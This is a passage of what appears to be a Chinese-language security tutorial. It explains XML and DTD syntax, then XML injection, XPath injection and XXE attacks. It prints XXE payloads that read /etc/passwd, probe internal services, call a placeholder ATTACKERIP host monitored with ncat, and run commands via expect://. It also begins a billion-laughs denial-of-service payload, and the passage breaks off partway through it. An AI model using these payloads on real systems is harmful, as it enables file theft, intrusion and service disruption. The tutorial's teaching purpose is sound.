    <content type="html"><![CDATA[<h2 id="xml"><a class="markdownIt-Anchor" href="#xml">#</a> XML</h2><p>XML 指可扩展标记语言（EXtensible Markup Language）。<br>XML 的设计宗旨是<strong>传输数据</strong>，而不是显示数据。<br>XML 是 W3C 的推荐标准。<br>XML 不会做任何事情。XML 被设计用来<strong>结构化、存储以及传输信息</strong>。<br>XML 语言没有预定义的标签。</p><p>XML 和 HTML 之间的差异：</p><p>1、XML 不是 HTML 的替代。<br>2、XML 和 HTML 为不同的目的而设计：</p><blockquote><p>XML 被设计用来传输和存储数据，其焦点是数据的内容。<br>HTML 被设计用来显示数据，其焦点是数据的外观。<br><strong>HTML 旨在显示信息，而 XML 旨在传输信息。</strong></p></blockquote><h3 id="基本格式-语法"><a class="markdownIt-Anchor" href="#基本格式-语法">#</a> 基本格式、语法</h3><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> standalone=<span class="string">&quot;yes&quot;</span>?&gt;</span><span class="comment">&lt;!--xml文件的声明--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bookstore</span>&gt;</span>                                                 <span class="comment">&lt;!--根元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">book</span> <span class="attr">category</span>=<span class="string">&quot;COOKING&quot;</span>&gt;</span>        <span class="comment">&lt;!--bookstore的子元素，category为属性--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Everyday Italian<span class="tag">&lt;/<span class="name">title</span>&gt;</span>           <span class="comment">&lt;!--book的子元素，lang为属性--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">author</span>&gt;</span>Giada De Laurentiis<span class="tag">&lt;/<span class="name">author</span>&gt;</span>                  <span class="comment">&lt;!--book的子元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">year</span>&gt;</span>2005<span class="tag">&lt;/<span class="name">year</span>&gt;</span>                                     <span class="comment">&lt;!--book的子元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">price</span>&gt;</span>30.00<span class="tag">&lt;/<span class="name">price</span>&gt;</span>                                  <span class="comment">&lt;!--book的子元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">book</span>&gt;</span>                                                 <span class="comment">&lt;!--book的结束--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bookstore</span>&gt;</span>                                       <span class="comment">&lt;!--bookstore的结束--&gt;</span></span><br></pre></td></tr></table></figure></div><p><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</code>  称为 XML prolog ，用于声明 XML 文档的版本和编码，是可选的，必须放在文档开头。<br>standalone 值是 yes 的时候表示 DTD 仅用于验证文档结构，从而外部实体将被禁用，但它的默认值是 no，而且有些 parser 会直接忽略这一项。</p><p><em>基本语法：</em></p><ul><li>所有 XML 元素都须有关闭标签。</li><li>XML 标签对大小写敏感。</li><li>XML 必须正确地嵌套。</li><li>XML 文档必须有根元素。</li><li>XML 的属性值须加引号。</li></ul><h2 id="dtd"><a class="markdownIt-Anchor" href="#dtd">#</a> DTD</h2><p><strong>DTD 基本概念</strong><br> XML 文档有自己的一个格式规范，这个格式规范是由一个叫做  <code>DTD（document type definition）</code>  的东西控制的。<br>DTD 用来为 XML 文档定义语义约束。可以嵌入在 XML 文档中 (内部声明)，也可以独立的放在另外一个单独的文件中 (外部引用)。是 XML 文档中的几条语句，用来<strong>说明哪些元素 / 属性是合法的以及元素间应当怎样嵌套 / 结合</strong>，也用来将一些特殊字符和可复用代码段自定义为实体。<br><strong>实体引用</strong><br> XML 元素以形如  <code>&lt;tag&gt;foo&lt;/tag&gt;</code>  的标签开始和结束，如果元素内部出现如 <code>&lt;</code>  的特殊字符，解析就会失败，为了避免这种情况，XML 用实体引用（entity reference）替换特殊字符。XML 预定义五个实体引用，即用 <code>&amp;lt;&amp;gt;&amp;amp;&amp;apos;&amp;quot</code>  替换  <code>&lt; &gt; &amp; ' &quot;</code>  。</p><p><img lazyload src="/images/loading.svg" data-src="https://fc04db.oss-cn-hangzhou.aliyuncs.com/image/202405291625057.png" alt="image-20240529162528891"></p><p>实体引用可以起到类似宏定义和文件包含的效果，为了方便，我们会希望自定义实体引用，这个操作在称为  <code>Document Type Defination（DTD</code> ，文档类型定义）的过程中进行。<br><strong>dtd 的引入方式</strong><br> DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。<br><em>内部 DTD</em><br> 使用内部的 dtd 文件，即将约束规则定义在 xml 文档中</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 根元素名称 [元素声明]&gt;</span></span><br></pre></td></tr></table></figure></div><p>示例代码：</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [&lt;!--定义此文档是 note 类型的文档--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">to</span>,<span class="keyword">from</span>,<span class="keyword">heading</span>,<span class="keyword">body</span>)&gt;</span>&lt;!--定义note元素有四个元素--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">to</span> (<span class="keyword">#PCDATA</span>)&gt;</span>&lt;!--定义to元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">from</span> (<span class="keyword">#PCDATA</span>)&gt;</span>&lt;!--定义from元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">head</span> (<span class="keyword">#PCDATA</span>)&gt;</span>&lt;!--定义head元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">body</span> (<span class="keyword">#PCDATA</span>)&gt;</span>&lt;!--定义body元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Y0u<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>@re<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>v3ry<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>g00d!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p><em>外部 DTD</em><br>（1）引入外部的 dtd 文件</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 根元素名称 <span class="keyword">SYSTEM</span> <span class="string">&quot;dtd路径&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p>（2）使用外部的 dtd 文件 (网络上的 dtd 文件)</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 根元素 <span class="keyword">PUBLIC</span> <span class="string">&quot;DTD名称&quot;</span> <span class="string">&quot;DTD文档的URL&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p>当使用外部 DTD 时，通过如下语法引入：</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root-element</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;filename&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p>示例代码：</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root-element</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;test.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Y0u<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>@re<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>v3ry<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>g00d!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p>test.dtd</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">to</span> (<span class="keyword">#PCDATA</span>)&gt;</span><span class="comment">&lt;!--定义to元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">from</span> (<span class="keyword">#PCDATA</span>)&gt;</span><span class="comment">&lt;!--定义from元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">head</span> (<span class="keyword">#PCDATA</span>)&gt;</span><span class="comment">&lt;!--定义head元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">body</span> (<span class="keyword">#PCDATA</span>)&gt;</span><span class="comment">&lt;!--定义body元素为”#PCDATA”类型--&gt;</span></span><br></pre></td></tr></table></figure></div><p><strong>PCDATA</strong><br>PCDATA 的意思是被解析的字符数据。PCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。文本中的标签会被当作标记来处理，而实体会被展开。<br><strong>CDATA</strong><br>CDATA 意思是字符数据，CDATA 是不会被解析器解析的文本，在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。</p><p><strong>元素</strong></p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT element-name category&gt;</span><br><span class="line">或</span><br><span class="line">&lt;!ELEMENT element-name (element-content)&gt;</span><br></pre></td></tr></table></figure></div><p>例如：</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ELEMENT 家庭(人+,家电*)&gt;</span></span><br></pre></td></tr></table></figure></div><p>这个 DTD 规定了家庭元素中可以有 1 到多个” 人” 这个子元素，也可以有 0 到多个” 家电” 这个子元素。其中的加号”+” 和星号”*” 的含义与正则表达式中的含义一致。</p><p><img lazyload src="/images/loading.svg" data-src="https://fc04db.oss-cn-hangzhou.aliyuncs.com/image/202405291637640.png" alt="image-20240529163707592"></p><p>类似于正则表达式</p><p><strong>属性</strong></p><p><strong>属性声明语法</strong>：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ATTLIST 元素名称 属性名称 属性类型 默认值&gt;</span><br></pre></td></tr></table></figure></div><p>DTD 实例：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ATTLIST payment Luckey CDATA &quot;Q&quot;&gt;</span><br></pre></td></tr></table></figure></div><p>XML 实例：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;payment Luckey=&quot;Q&quot; /&gt;</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://fc04db.oss-cn-hangzhou.aliyuncs.com/image/202405291638220.png" alt="image-20240529163855082"></p><p>默认<strong>属性值</strong>可使用下列值 :</p><p><img lazyload src="/images/loading.svg" data-src="https://fc04db.oss-cn-hangzhou.aliyuncs.com/image/202405291639746.png" alt="image-20240529163957712"></p><p><strong>默认属性值</strong></p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">DTD:</span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">square</span> <span class="keyword">EMPTY</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ATTLIST <span class="keyword">square</span> <span class="keyword">width</span> <span class="keyword">CDATA</span> <span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">合法的 XML:</span><br><span class="line"><span class="tag">&lt;<span class="name">square</span> <span class="attr">width</span>=<span class="string">&quot;100&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure></div><p>在上面的例子中，“square” 被定义为带有 CDATA 类型的 “width” 属性的空元素。如果宽度没有被设定，其默认值为 0</p><h1 id="xml注入"><a class="markdownIt-Anchor" href="#xml注入">#</a> XML 注入</h1><p>XML 是一种数据组织存储的数据结构方式，安全的 XML 在用户输入生成新的数据时候应该只能允许用户接受的数据，需要过滤掉一些可以改变 XML 标签也就是说改变 XML 结构插入新功能（例如新的账户信息，等于添加了账户）的特殊输入，如果没有过滤，则可以导致 XML 注入攻击。</p><p>注入实例：</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">manager</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">admin</span> <span class="attr">id</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">username</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">password</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">admin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">admin</span> <span class="attr">id</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">username</span>&gt;</span>root<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">password</span>&gt;</span>root<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">admin</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manager</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p>XML 与 HTML 一样，也存在注入攻击，在注入的方法上也非常相似。<br>对于上面的 xml 文件，如果攻击者能够掌控 password 字段，那么就会产生 XML 注入。如攻击者输入：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin &lt;/password&gt;&lt;/admin&gt;&lt;admin id=&quot;3&quot;&gt;&lt;name&gt;hack&lt;/name&gt;&lt;password&gt;hacker&lt;/password&gt;&lt;/admin&gt;</span><br></pre></td></tr></table></figure></div><p>最终修改结果为：</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">manager</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">admin</span> <span class="attr">id</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">password</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">admin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">admin</span> <span class="attr">id</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">username</span>&gt;</span>root<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">password</span>&gt;</span>root<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">admin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">admin</span> <span class="attr">id</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>hack<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">password</span>&gt;</span>hacker<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">admin</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manager</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p>这样就通过 XML 注入添加了一个名为 hack、密码为：hacker 的管理员账户。<br>XML 注入两大要素：<strong>标签闭合和获取 XML 表结构</strong></p><h1 id="xpath注入"><a class="markdownIt-Anchor" href="#xpath注入">#</a> XPath 注入</h1><p>XPath 是一门在 XML 文档中查找信息的语言。XPath 用于在 XML 文档中，通过元素和属性进行导航。类似 jquery 选择器的选择路径。</p><p>XPath 注入攻击是指利用 XPath 解析器的松散输入和容错特性，能够在 URL、表单或其它信息上附带恶意的 XPath 查询代码，以获得权限信息的访问权并更改这些信息。XPath 注入攻击是针对 Web 服务应用新的攻击方法，它允许攻击者在事先不知道 XPath 查询相关知识的情况下，通过 XPath 查询得到一个 XML 文档的完整内容。</p><p>XPath 注入发生在当站点使用用户输入的信息来构造请求以获取 XML 数据。攻击者对站点发送经过特殊构造的信息来探究站点使用的 XML 是如何构造的，从而进一步获取正常途径下无法获取的数据。当 XML 数据被用作账户验证时，攻击者还可以提升他的权限。</p><p>XPath 注入攻击利用两种技术，即<strong> XPath 扫描</strong>和 <strong>XPath 查询布尔化</strong>。通过该攻击，攻击者可以控制用来进行 XPath 查询的 XML 数据库。这种攻击可以有效地对付使用 XPath 查询（和 XML 数据库） 来执行身份验证、查找或者其它操作。</p><p>XPath 注入攻击同 SQL 注入攻击类似，但与 SQL 注入相比，XPath 具有的优势：</p><ol><li>广泛性<br>只要是利用 XPath 语法的 Web 应用程序若未对输入的 XPath 查询做严格的处理都会存在 XPath 注入漏洞。而在 SQL 注入攻击过程中根据数据库支持的 SQL 语言不同，注入攻击的实现可能不同。</li><li>危害性大<br> XPath 语言几乎可以没有访问控制限制的引用 XML 文档的所有部分。而在 SQL 注入中，一个 “ <code>用户</code> ” 的权限可能被限制到 某一特定的表、列或者查询。<br>XPath 注入攻击可以保证得到完整的 XML 文档，即完整的数据库。只要 Web 服务应用具有基本的安全漏洞，即可构造针对 XPath 应用的自动攻击。</li></ol><p><a class="link" href="https://www.cnblogs.com/backlion/p/8554749.html">xpath 注入详解 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h1 id="xxe"><a class="markdownIt-Anchor" href="#xxe">#</a> XXE</h1><p><code>XXE(XML External Entity Injection)</code>  全称为 XML 外部实体注入，由于程序在解析输入的 XML 数据时，解析了攻击者伪造的外部实体而产生的。例如 PHP 中的 <code>simplexml_load</code>  默认情况下会解析外部实体，有 XXE 漏洞的标志性函数为 <code>simplexml_load_string()</code> ，它允许攻击者干扰应用程序对 XML 数据的处理。它通常允许攻击者查看应用程序服务器文件系统上的文件，并与应用程序本身可以访问的任何后端或外部系统进行交互。</p><p><strong>XXE 的特征</strong></p><p>特征 1 —  <code>.ashx</code> ，url 是，ashx 后缀</p><p>特征 2 — 响应体是 xml</p><p><strong>XXE 的检测</strong></p><p>首先检测 XML 是否会被成功解析</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span> <span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [ <span class="meta">&lt;!ENTITY <span class="keyword">words</span> <span class="string">&quot;Hello XXE !&quot;</span>&gt;</span>]&gt;</span><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;words;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p>看相应包或页面是否有 <code>Hellp XXE</code></p><p>接下来检测该端点是否支持 DTD 引用外部实体：</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=”1.0” encoding=”UTF-8”?&gt;</span><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [<span class="meta">&lt;!ENTITY % <span class="keyword">name</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://localhost/tp5/test.xml&quot;</span>&gt;</span>%name;]&gt;</span></span><br></pre></td></tr></table></figure></div><h2 id="文件读取"><a class="markdownIt-Anchor" href="#文件读取">#</a> 文件读取</h2><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span> <span class="meta">&lt;!DOCTYPE <span class="keyword">xxe</span> [<span class="meta">&lt;!ELEMENT <span class="keyword">name</span> <span class="keyword">ANY</span> &gt;</span><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span> &gt;</span>]&gt;</span><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p>前提是需要有回显</p><h2 id="ssrf与xxe"><a class="markdownIt-Anchor" href="#ssrf与xxe">#</a> SSRF 与 XXE</h2><p>XXE 可以与 SSRF（服务端请求伪造） 漏洞一起用于探测其它内网主机的信息，基于 http 协议。</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY % xxe SYSTEM &quot;http://internal.service/secret_pass.txt&quot; &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br></pre></td></tr></table></figure></div><p>当然也可以用来探测端口信息，根据响应包的信息，若非 “connection refused” 则表示该端口可能是开放的。</p><p>除了以上的利用，控制服务器对外网发送请求也是有可能成功的。此处可使用 ncat 工具进行测试。</p><p>用 ncat 在自己的服务器上开启监听：ncat -lvkp 8081 (端口可自定义)</p><p>之后便可使用以下语句尝试是否能够建立连接：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;  &lt;!DOCTYPE data SYSTEM &quot;http://ATTACKERIP:8081/&quot; [  &lt;!ELEMENT data (#PCDATA)&gt;  ]&gt;&lt;data&gt;4&lt;/data&gt;</span><br></pre></td></tr></table></figure></div><p>如果能够建立连接，那么服务器端的 netcat 会收到相应的请求信息。</p><h2 id="rce"><a class="markdownIt-Anchor" href="#rce">#</a> RCE</h2><p>在安装 expect 扩展的 PHP 环境里执行系统命令，当然其他协议也有可能可以执行系统命令</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;</span><br></pre></td></tr></table></figure></div><h2 id="拒绝服务攻击dos"><a class="markdownIt-Anchor" href="#拒绝服务攻击dos">#</a> 拒绝服务攻击 (Dos)</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">   &lt;!DOCTYPE lolz [</span><br><span class="line">&lt;!ENTITY lol &quot;lol&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol7 